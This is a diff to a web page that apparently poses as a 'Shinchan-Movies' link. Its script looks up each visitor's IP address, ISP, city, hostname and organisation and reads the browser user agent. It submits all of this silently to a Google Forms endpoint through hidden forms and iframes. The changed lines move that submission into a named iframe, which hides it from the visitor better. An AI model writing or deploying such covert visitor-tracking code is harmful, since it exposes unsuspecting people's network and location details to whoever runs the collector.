@@ -38,7 +38,7 @@
 //var ui = "ISP" + ":" + json.isp + "," + "PIP" + ":" + json.ip + "," + "," + "city" + ":" + json.city + "," + "," + "hostname" +  ":" + json.hostname + "," + "," + "Org" + ":" + json.org;  
    
 Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org;
-window.location = `https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org}&entry.470512502=Device:${navigator.userAgent}`;
+window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org}&entry.470512502=Device:${navigator.userAgent}`,"jv");;
 window.open("https://vv-1757.github.io/Shinchan-Movies/","blank");
 }   
     
@@ -62,7 +62,7 @@ window.open("https://vv-1757.github.io/Shinchan-Movies/","blank");
      <span id="Loader">
        <img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" width="40" height="40"> 
      </span>  
-       
+    <iframe name="jv"></iframe>   
    </div>    
    <iframe name="fp" style="display:None;"></iframe>
     <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse" style="display:none;" id="form" target="fp" method="POST">
